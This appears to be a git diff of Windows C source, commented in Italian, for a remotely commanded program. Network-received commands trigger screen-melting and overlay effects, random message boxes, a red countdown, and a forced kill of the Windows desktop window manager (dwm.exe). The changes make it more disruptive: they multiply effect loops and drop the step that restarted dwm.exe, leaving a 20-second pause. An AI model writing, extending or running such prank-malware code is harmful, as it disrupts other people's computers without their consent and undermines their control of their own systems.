@@ -148,7 +148,7 @@ void squarefx_run() {
 // ho capito che hdc significa HandleDeviceContext, tradotto: accesso grafico allo schermo
 // Invece GetDC(NULL) si piglia tutto schermo. Forse già lo sapevi
 // DC = DeviceContext
-void bmp_on_screen() {
+void lulu() {
     w = GetSystemMetrics(SM_CXSCREEN);
     h = GetSystemMetrics(SM_CYSCREEN);
 
@@ -207,13 +207,14 @@ void msgbox() {
     // y = byte (o char (bcz 1 char = 1 byte)) per contenitore
     // se ho x byte devo dichiarare x + 1. Ex: in una frase di 7 char ne devo dikiarare 8 bcz '\0' ('\0' sta sempre alla fine!)
     // if u want puoi togliere il [6] in [], il compilatore capisce dal numero di frasi.
-    char frasi[6][200] = { // ricordiamo il seguente personaggio: Breiscot (aka DMAX, QLIMAX, EMACS) - Ha dato contributo nelle frasi di testing
+    char frasi[7][200] = { // ricordiamo il seguente personaggio: Breiscot (aka DMAX, QLIMAX, EMACS) - Ha dato contributo nelle frasi di testing
         "Non prendere la vita troppo seriamente. Non ne uscirai vivo.",
         "Il piacere piu' grande della vita e' fare cio' che le persone dicono che non puoi fare",
         "Dovresti ascoltare piu' hardstyle... Ye, sono serio",
         "C'e' una canzone che fa: TU TU TU TU TU TU TU TUTUTU BRBRBRBRBRBRBRBRBRBRBRBR",
         "Secondo te dovrei usare dei puntatori o degli array per mostrare ste frasi con rand()?",
-        "sta funzione e' sperimentale, ho messo frasi di merda"
+        "Pensa che esiste gente cosi' stupida che mette l'uovo nell'insalata di riso",
+        "Che tristezza la neomelodica :("
     };
 
     int randomtext = rand() % 6; // ricorda di updatare qui quando addi frasi nuove, so che te lo scordi.
@@ -228,7 +229,7 @@ void countdown(int secs) { // passa secs da curl
 
     //parametri & settings 4 dwm displaying
     SetBkMode(hdc, OPAQUE); // no bordi strani dietro
-    SetTextColor(hdc, RGB(0,0,0)); // colore testo black
+    SetTextColor(hdc, RGB(255,0,0)); // colore testo red
     HFONT font = CreateFont(128, 0, 0, 0, FW_BOLD, FALSE, FALSE, FALSE, ANSI_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS,CLEARTYPE_QUALITY, DEFAULT_PITCH | FF_DONTCARE, "Arial");
     SelectObject(hdc, font);
 
@@ -344,14 +345,14 @@ int main() {
 
         else if (strstr(reqtextbuffer, "7")) {
             int i;
-            for (i=0;i<100;i++) {
+            for (i=0;i<500;i++) {
                 squarefx_run();
             }
         }
 
         else if (strstr(reqtextbuffer, "8")) {
             int i;
-            for (i=0;i<100;i++) {
+            for (i=0;i<1000;i++) {
                 fkngmelter();
             }
         }
@@ -366,12 +367,12 @@ int main() {
         }
         else if (strstr(reqtextbuffer, "CleanDWM")) {
             system("TASKKILL /F /IM dwm.exe"); // killa dwm (previsto: riavvio automatico di DWM)
-            system("start dwm.exe"); // avvio di dwm (nel caso windows non lo riavvi automaticamente)
+            Sleep(20000);
         }
-        else if (strstr(reqtextbuffer, "BMPFx1")) {
+        else if (strstr(reqtextbuffer, "Lulu")) {
             int i;
-            for (i=0;i<100;i++) {
-                bmp_on_screen();
+            for (i=0;i<500;i++) {
+                lulu();
             }
         }
         else if (strstr(reqtextbuffer, "RandomMSGs")) {
